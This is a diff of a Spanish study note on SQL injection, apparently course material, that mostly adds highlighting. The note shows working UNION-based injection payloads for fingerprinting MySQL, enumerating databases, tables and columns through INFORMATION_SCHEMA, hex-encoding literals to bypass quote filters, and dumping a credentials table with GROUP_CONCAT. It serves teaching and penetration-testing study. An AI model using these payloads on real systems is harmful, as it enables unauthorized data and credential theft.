@@ -9,25 +9,23 @@ Nota previa: "[[05 - Inyección UNION]]"
 Nota siguiente: "[[07 - Lectura de archivos]]"
 Area: "[[SQL Injection.base|SQL Injection]]"
 ---
----
-
-Con una [[05 - Inyección UNION|inyección UNION]] funcional y una columna visible, el objetivo es mapear y volcar el contenido del DBMS. El proceso es metódico: identificar el motor, listar bases de datos, sus tablas, sus columnas y, finalmente, extraer los datos. La llave maestra es la base de datos de metadatos `INFORMATION_SCHEMA`.
+Con una [[05 - Inyección UNION|inyección UNION]] funcional y una columna visible, el objetivo es **mapear y volcar el contenido del DBMS**. El proceso es metódico: <mark style="background: #ADCCFFA6;">identificar el motor, listar bases de datos, sus tablas, sus columnas y, finalmente, extraer los datos</mark>. <mark style="background: #FF5582A6;">La llave maestra es la base de datos de metadatos </mark>`INFORMATION_SCHEMA`.
 
 # Fingerprinting del DBMS
 
-Cada motor tiene su sintaxis, así que primero hay que confirmar cuál es. Pistas del servidor web (Apache/Nginx → probablemente Linux → MySQL; IIS → probablemente MSSQL) son orientativas, no concluyentes. Lo fiable es probar consultas específicas:
+Cada motor tiene su sintaxis, así que primero hay que confirmar cuál es. **Pistas del servidor web** (*Apache*/*Nginx* → probablemente Linux → *MySQL* | *IIS* → probablemente *MSSQL*) <mark style="background: #FF5582A6;">son orientativas, no concluyentes</mark>. Lo fiable es probar consultas específicas:
 
-| Payload | Cuándo usarlo | Salida en MySQL |
-| ------- | ------------- | --------------- |
+| **Payload**        | **Cuándo usarlo**       | **Salida en MySQL**               |
+| ------------------ | ----------------------- | --------------------------------- |
 | `SELECT @@version` | Salida completa visible | Versión, p. ej. `10.3.22-MariaDB` |
-| `SELECT POW(1,1)` | Solo salida numérica | `1` (error en otros motores) |
-| `SELECT SLEEP(5)` | A ciegas / sin salida | Retarda 5 s y devuelve `0` |
+| `SELECT POW(1,1)`  | Solo salida numérica    | `1` (error en otros motores)      |
+| `SELECT SLEEP(5)`  | A ciegas / sin salida   | Retarda 5 s y devuelve `0`        |
 
 Una salida como `10.3.22-MariaDB-1ubuntu1` confirma <mark style="background: #ADCCFFA6;">MariaDB, un fork de MySQL con sintaxis prácticamente idéntica</mark>.
 
 # `INFORMATION_SCHEMA`: el mapa del DBMS
 
-Para construir un `UNION SELECT` que extraiga datos concretos necesitamos saber qué bases, tablas y columnas existen. <mark style="background: #8000E1A6;">`INFORMATION_SCHEMA` es una base de datos del sistema que contiene los metadatos de todo el servidor</mark>. Al ser otra base de datos, sus tablas no se referencian directamente: se usa el operador punto (`.`):
+Para construir un `UNION SELECT` que extraiga datos concretos <mark style="background: #ADCCFFA6;">necesitamos saber qué bases, tablas y columnas existen</mark>. `INFORMATION_SCHEMA`<mark style="background: #FFB86CA6;"> es una base de datos del sistema que contiene los metadatos de todo el servidor</mark>. Al ser otra base de datos, <mark style="background: #FFB8EBA6;">sus tablas no se referencian directamente</mark>: se usa el operador punto (`.`):
 
 ```sql
 SELECT * FROM otra_base.tabla;
@@ -35,13 +33,13 @@ SELECT * FROM otra_base.tabla;
 
 # `SCHEMATA` → bases de datos
 
-La tabla `SCHEMATA` lista todas las bases; su columna `SCHEMA_NAME` contiene los nombres:
+La tabla `SCHEMATA`<mark style="background: #ADCCFFA6;"> lista todas las bases</mark>; su columna `SCHEMA_NAME`<mark style="background: #FFB86CA6;"> contiene los nombres</mark>:
 
 ```sql
 cn' UNION SELECT 1,schema_name,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
 ```
 
-Además, `database()` revela la base en uso por la aplicación:
+Además, `database()` revela la <mark style="background: #FFB8EBA6;">base en uso por la aplicación</mark>:
 
 ```sql
 cn' UNION SELECT 1,database(),3,4-- -
@@ -52,14 +50,14 @@ cn' UNION SELECT 1,database(),3,4-- -
 
 # `TABLES` → tablas de una base
 
-La tabla `TABLES` mapea cada tabla a su base mediante `TABLE_NAME` y `TABLE_SCHEMA`. Filtrando por la base objetivo:
+La tabla `TABLES` **mapea cada tabla a su base** mediante `TABLE_NAME` y `TABLE_SCHEMA`. Filtrando por la base objetivo:
 
 ```sql
 cn' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='dev'-- -
 ```
 
 > [!warning]+
-> El filtro `WHERE table_schema='dev'` es esencial: sin él se listan **todas** las tablas de **todas** las bases, ruido inmanejable. Pero introduce comillas anidadas que pueden romper el payload o ser filtradas. <mark style="background: #FFB86CA6;">La solución profesional es codificar el literal en hexadecimal</mark>: `WHERE table_schema=0x646576` equivale a `='dev'` sin usar ni una comilla —imprescindible cuando un filtro las bloquea—.
+> El filtro `WHERE table_schema='dev'` es esencial: sin él se listan **todas** las tablas de **todas** las bases, <mark style="background: #FF5582A6;">ruido inmanejable</mark>. Pero introduce comillas anidadas que pueden romper el payload o ser filtradas. <mark style="background: #ADCCFFA6;">La solución profesional es codificar el literal en hexadecimal</mark>: `WHERE table_schema=0x646576` equivale a "*='dev'*" sin usar ni una comilla —**imprescindible** cuando un filtro las bloquea—.
 
 # `COLUMNS` → columnas de una tabla
 
@@ -84,7 +82,7 @@ Esto devuelve hashes de contraseñas y claves API: el objetivo final.
 > ```sql
 > cn' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),3,4 FROM dev.credentials-- -
 > ```
-> Aquí `0x3a` es `:` y `0x0a` es un salto de línea (de nuevo, hex para evitar comillas). Es la técnica estándar para exfiltrar una tabla entera de un solo disparo, y un patrón que [[SQLMap.base|SQLMap]] automatiza internamente.
+> Aquí `0x3a` es `:` y `0x0a` es un salto de línea (de nuevo, hex para evitar comillas). Es la <mark style="background: #FF5582A6;">técnica estándar para exfiltrar una tabla entera de un solo disparo</mark>, y un patrón que [[SQLMap.base|SQLMap]] automatiza internamente.
 
 > [!info]+
 > Para ejecutar consultas arbitrarias —no solo `SELECT` de columnas— se puede envolver con `CAST(... AS NCHAR)`, p. ej. `CAST(current_user AS NCHAR)`, útil cuando se quiere el resultado de una función en una posición que espera texto.
